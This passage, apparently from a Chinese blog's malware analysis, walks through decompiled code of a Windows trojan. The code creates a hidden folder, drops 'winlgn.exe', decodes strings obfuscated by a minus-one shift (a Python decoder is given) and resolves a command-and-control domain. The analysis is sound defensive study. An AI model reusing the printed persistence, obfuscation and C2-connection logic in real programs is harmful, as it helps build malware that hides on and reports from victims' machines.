class="line">&#123;</span><br><span class="line">  HWND Window; <span class="comment">// 窗口句柄</span></span><br><span class="line">  HWND v5; <span class="comment">// 加速器句柄</span></span><br><span class="line">  HACCEL AcceleratorsA; <span class="comment">// 加速器表</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// 内存分配指针</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// 用于释放内存的指针</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> <span class="title">Msg</span>;</span> <span class="comment">// 消息结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载窗口名称和类名</span></span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x67u</span>, WindowName, <span class="number">100</span>);</span><br><span class="line">  LoadStringA(hInstance, <span class="number">0x6Du</span>, ClassName, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行某些初始化或设置操作</span></span><br><span class="line">  sub_402920();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将全局 hInstance 设置为传入的 hInstance</span></span><br><span class="line">  ::hInstance = hInstance;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建窗口</span></span><br><span class="line">  Window = CreateWindowExA(<span class="number">0</span>, ClassName, WindowName, <span class="number">0xCF0000u</span>, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">  v5 = Window;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果窗口创建失败，则返回 0</span></span><br><span class="line">  <span class="keyword">if</span> (!Window)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 显示窗口</span></span><br><span class="line">  ShowWindow(Window, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新窗口</span></span><br><span class="line">  UpdateWindow(v5);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载加速器表</span></span><br><span class="line">  AcceleratorsA = LoadAcceleratorsA(hInstance, (LPCSTR)<span class="number">0x6D</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 分配一块内存，但立即释放</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x5F5E100u</span>);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> (v7)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x5F5E100u</span>);</span><br><span class="line">    <span class="built_in">free</span>(v8);</span><br><span class="line">    <span class="comment">// 执行某些清理操作</span></span><br><span class="line">    sub_401130();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 进入消息循环</span></span><br><span class="line">  <span class="keyword">while</span> (GetMessageA(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果消息是加速器消息，则翻译并执行对应的命令</span></span><br><span class="line">    <span class="keyword">if</span> (!TranslateAcceleratorA(Msg.hwnd, AcceleratorsA, &amp;Msg))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 否则，将消息转换为字符消息，并分派给窗口过程函数处理</span></span><br><span class="line">      TranslateMessage(&amp;Msg);</span><br><span class="line">      DispatchMessageA(&amp;Msg);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回退出码</span></span><br><span class="line">  <span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="sub-402920"><a href="#sub-402920" class="headerlink" title="sub_402920"></a>sub_402920</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册窗口类的函数</span></span><br><span class="line"><span class="comment">// Parameters:</span></span><br><span class="line"><span class="comment">//   a1: 实例句柄，用于标识应用程序的实例</span></span><br><span class="line"><span class="comment">// Returns:</span></span><br><span class="line"><span class="comment">//   注册窗口类的原子值</span></span><br><span class="line">ATOM __usercall sub_402920@(HINSTANCE a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 定义一个窗口类结构体变量</span></span><br><span class="line">  WNDCLASSEXA v2; <span class="comment">// [esp+4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置结构体的大小</span></span><br><span class="line">  v2.cbSize = <span class="number">48</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类的样式</span></span><br><span class="line">  v2.style = <span class="number">3</span>;</span><br><span class="line">  <span class="comment">// 设置窗口过程函数指针</span></span><br><span class="line">  v2.lpfnWndProc = sub_4029B0;</span><br><span class="line">  <span class="comment">// 设置额外的类空间</span></span><br><span class="line">  v2.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 设置额外的窗口空间</span></span><br><span class="line">  v2.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类所属的实例句柄</span></span><br><span class="line">  v2.hInstance = a1;</span><br><span class="line">  <span class="comment">// 加载大图标资源</span></span><br><span class="line">  v2.hIcon = LoadIconA(a1, (LPCSTR)<span class="number">0x6B</span>);</span><br><span class="line">  <span class="comment">// 加载光标资源</span></span><br><span class="line">  v2.hCursor = LoadCursorA(<span class="number">0</span>, (LPCSTR)<span class="number">0x7F00</span>);</span><br><span class="line">  <span class="comment">// 设置窗口背景画刷句柄</span></span><br><span class="line">  v2.hbrBackground = (HBRUSH)<span class="number">6</span>;</span><br><span class="line">  <span class="comment">// 设置菜单资源的 ID</span></span><br><span class="line">  v2.lpszMenuName = (LPCSTR)<span class="number">109</span>;</span><br><span class="line">  <span class="comment">// 设置窗口类名</span></span><br><span class="line">  v2.lpszClassName = ClassName;</span><br><span class="line">  <span class="comment">// 加载小图标资源</span></span><br><span class="line">  v2.hIconSm = LoadIconA(v2.hInstance, (LPCSTR)<span class="number">0x6C</span>);</span><br><span class="line">  <span class="comment">// 注册窗口类并返回结果</span></span><br><span class="line">  <span class="keyword">return</span> RegisterClassExA(&amp;v2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这个函数注册了一个窗口</p>
+<blockquote>
+<p>下面再分析一下窗口过程函数</p>
+</blockquote>
+<h4 id="sub-4029B0"><a href="#sub-4029B0" class="headerlink" title="sub_4029B0"></a>sub_4029B0</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 处理窗口消息的回调函数</span></span><br><span class="line">LRESULT __stdcall <span class="title function_">sub_4029B0</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// 绘制结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果消息类型小于等于0xF，处理基本的系统消息</span></span><br><span class="line">  <span class="keyword">if</span> ( Msg &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( Msg )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 处理窗口重绘消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xFu</span>:</span><br><span class="line">        BeginPaint(hWnd, &amp;Paint); <span class="comment">// 开始绘制</span></span><br><span class="line">        EndPaint(hWnd, &amp;Paint); <span class="comment">// 结束绘制</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">      <span class="comment">// 处理定时器消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        SetTimer(hWnd, <span class="number">1u</span>, <span class="number">0x1770u</span>, TimerFunc); <span class="comment">// 设置定时器</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">      <span class="comment">// 处理窗口关闭消息</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>); <span class="comment">// 通知应用程序退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, Msg, wParam, lParam); <span class="comment">// 其他基本系统消息，调用默认处理函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果消息类型大于0xF，处理自定义应用程序消息</span></span><br><span class="line">  <span class="keyword">if</span> ( Msg != <span class="number">273</span> ) <span class="comment">// 检查是否是自定义消息</span></span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, Msg, wParam, lParam); <span class="comment">// 不是自定义消息，调用默认处理函数</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">104</span> ) <span class="comment">// 自定义消息值为104</span></span><br><span class="line">  &#123;</span><br><span class="line">    DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, hWnd, DialogFunc, <span class="number">0</span>); <span class="comment">// 弹出对话框</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">105</span> ) <span class="comment">// 自定义消息值为105</span></span><br><span class="line">  &#123;</span><br><span class="line">    DestroyWindow(hWnd); <span class="comment">// 销毁窗口</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 消息已处理，返回0</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProcA(hWnd, <span class="number">0x111u</span>, wParam, lParam); <span class="comment">// 其他自定义消息，调用默认处理函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="sub-401130"><a href="#sub-401130" class="headerlink" title="sub_401130"></a>sub_401130</h3><p><strong>这个函数是用来创建隐藏目录并复制一些文件</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401130</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line">  CHAR *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *v7; <span class="comment">// edx</span></span><br><span class="line">  BYTE *v8; <span class="comment">// ecx</span></span><br><span class="line">  CHAR *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v10; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建一个名称为&#x27;Path&#x27;的目录</span></span><br><span class="line">  _mkdir((<span class="type">const</span> <span class="type">char</span> *)Path);</span><br><span class="line">  <span class="comment">// 将目录的文件属性设置为&#x27;2u&#x27;</span></span><br><span class="line">  SetFileAttributesA((LPCSTR)Path, <span class="number">2u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将&#x27;Path&#x27;中的每个字符复制到&#x27;byte_413298&#x27;中，直到遇到空终止符</span></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = Path[v0];</span><br><span class="line">    byte_413298[v0++] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取一个字符串&quot;oDbdi&quot;并将其存储在&#x27;v2&#x27;中</span></span><br><span class="line">  v2 = sub_4026E0(<span class="string">&quot;oDbdi&quot;</span>, <span class="number">1</span>);                                                <span class="comment">// nCach</span></span><br><span class="line">  <span class="comment">// 将&quot;\\&quot;附加到&#x27;Path&#x27;末尾</span></span><br><span class="line">  *(_WORD *)&amp;Path[<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Path)] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  <span class="comment">// 将&quot;\\&quot;附加到&#x27;byte_413298&#x27;末尾</span></span><br><span class="line">  *(_WORD *)&amp;byte_413298[<span class="built_in">strlen</span>(byte_413298)] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将&#x27;byte_413298&#x27;中的每个字符复制到&#x27;byte_4133A0&#x27;中，直到遇到空终止符</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = byte_413298[v3];</span><br><span class="line">    byte_4133A0[v3++] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将存储在&#x27;v2&#x27;中的字符串连接到&#x27;byte_4133A0&#x27;中</span></span><br><span class="line">  <span class="built_in">strcat</span>(byte_4133A0, v2);</span><br><span class="line">  <span class="comment">// 将字符串&quot;xjomho/fyf&quot;连接到&#x27;Path&#x27;中</span></span><br><span class="line">  <span class="built_in">strcat</span>((<span class="type">char</span> *)Path, sub_4026E0(<span class="string">&quot;xjomho/fyf&quot;</span>, <span class="number">1</span>));                                       <span class="comment">// winlgn.exe   // 这个是木马创建的文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用函数sub_401740()</span></span><br><span class="line">  sub_401740();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前模块的文件名并将其存储在&#x27;Filename&#x27;中</span></span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果文件名与&#x27;Path&#x27;不同，并且无法以只读模式打开文件，则调用sub_402740()</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(Filename, (<span class="type">const</span> <span class="type">char</span> *)Path) &amp;&amp; !fopen((<span class="type">const</span> <span class="type">char</span> *)Path, <span class="string">&quot;rb&quot;</span>) )</span><br><span class="line">    sub_402740();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当WSAStartup()返回非零值时，持续睡眠</span></span><br><span class="line">  <span class="keyword">while</span> ( WSAStartup(<span class="number">0x202u</span>, &amp;stru_412D00) )</span><br><span class="line">    Sleep(<span class="number">0x1388u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化pHints结构体的一些成员</span></span><br><span class="line">  pHints.ai_flags = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_addrlen = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_canonname = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_addr = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_next = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_family = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_socktype = <span class="number">1</span>;</span><br><span class="line">  pHints.ai_protocol = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取一个字符串&quot;pomjofkpiomjof::/psh&quot;并将其存储在&#x27;v5&#x27;中</span></span><br><span class="line">  v5 = sub_4026E0(<span class="string">&quot;pomjofkpiomjof::/psh&quot;</span>, <span class="number">1</span>);                                                 <span class="comment">// onlinejohnline99.org</span></span><br><span class="line">  v7 = pNodeName;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v6) = *v5;</span><br><span class="line">    *v7++ = *v5++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)v6 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用函数sub_401570()，传入参数v6和v7</span></span><br><span class="line">  sub_401570(v6, v7);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用循环比较&#x27;Path&#x27;和&#x27;Filename&#x27;中的字符，直到出现不相等的字符或遇到空终止符为止</span></span><br><span class="line">  v8 = Path;</span><br><span class="line">  v9 = Filename;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)*v9 &lt; *v8;</span><br><span class="line">    <span class="keyword">if</span> ( *v9 != *v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*v9 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    v11 = v9[<span class="number">1</span>];</span><br><span class="line">    v10 = v11 &lt; v8[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v11 != v8[<span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 += <span class="number">2</span>;</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果循环结束时v12为非零值，则调用sub_401360(v8)</span></span><br><span class="line">  v12 = -v10 - (v10 - <span class="number">1</span>);</span><br><span class="line">LABEL_19:</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    sub_401360(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>该函数的主要作用是在指定目录下创建一个隐藏目录，并将一些文件复制到该目录中，然后比较当前模块的文件路径与指定路径，如果不同，则执行一些额外的操作。</p>
+<blockquote>
+<p>下面再分析一下函数 sub_4026E0</p>
+</blockquote>
+<h4 id="sub-4026E0"><a href="#sub-4026E0" class="headerlink" title="sub_4026E0"></a>sub_4026E0</h4><p><strong>这个函数是为了简单加密字符串</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4026E0@&lt;eax&gt;(<span class="type">const</span> <span class="type">char</span> *a1@&lt;eax&gt;, <span class="type">char</span> a2)</span><br><span class="line"><span class="comment">// 定义一个函数 sub_4026E0，接受一个字符串和一个字符作为参数，用于简单加密字符串</span></span><br><span class="line"><span class="comment">// @param a1: 输入字符串的指针</span></span><br><span class="line"><span class="comment">// @param a2: 加密密钥字符</span></span><br><span class="line"><span class="comment">// @return: 返回加密后字符串的指针</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// 存储字符串的长度</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// 存储动态分配的内存空间的地址</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// 用于遍历加密后的字符串</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// 用于遍历原始字符串</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// 字符串的长度计数</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1); <span class="comment">// 获取字符串长度</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>); <span class="comment">// 动态分配内存空间，大小为字符串长度加1（用于存储结束符）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果字符串长度小于等于0，直接返回空字符串</span></span><br><span class="line">  <span class="keyword">if</span> (v3 &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    v5 = v4; <span class="comment">// 初始化加密后字符串的指针</span></span><br><span class="line">    v6 = (<span class="type">const</span> <span class="type">char</span> *)(a1 - v4); <span class="comment">// 获取原始字符串的起始位置</span></span><br><span class="line">    v7 = v3; <span class="comment">// 初始化字符串的长度计数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对原始字符串进行简单加密操作</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      *v5 = v5[(_DWORD)v6] - a2; <span class="comment">// 将原始字符串中的每个字符减去密钥字符</span></span><br><span class="line">      ++v5; <span class="comment">// 移动到下一个字符位置</span></span><br><span class="line">      --v7; <span class="comment">// 更新字符串长度计数</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (v7); <span class="comment">// 循环直到字符串结束</span></span><br><span class="line"></span><br><span class="line">    v4[v3] = <span class="number">0</span>; <span class="comment">// 在加密后字符串的末尾添加结束符</span></span><br><span class="line">    <span class="keyword">return</span> v4; <span class="comment">// 返回加密后字符串的指针</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>接受一个字符串和一个字符作为参数，然后将字符串中的每个字符减去给定的字符（密钥），从而对字符串进行加密。加密后的字符串存储在动态分配的内存空间中，并返回指向该内存空间的指针。</p>
+<p>实际上在这里秘钥是 1，所以加密后的字符串就是原始字符串的 ASCII 码每个字符减去 1。</p>
+<p>下面是等效的 Python 代码：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_ascii_1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) - key)</span><br><span class="line">            plaintext += decrypted_char</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入你的ASCII-1加密密文和密钥</span></span><br><span class="line">    ciphertext = <span class="built_in">input</span>(<span class="string">&quot;请输入要解密的ASCII-1加密密文：&quot;</span>)</span><br><span class="line">    key = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密并输出明文</span></span><br><span class="line">    plaintext = decrypt_ascii_1(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的明文：&quot;</span>, plaintext)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>下面再分析一下函数 sub_401740</p>
+</blockquote>
+<h4 id="sub-401740"><a href="#sub-401740" class="headerlink" title="sub_401740"></a>sub_401740</h4><p><strong>这个函数是为了获取计算机名、用户名</strong></p>
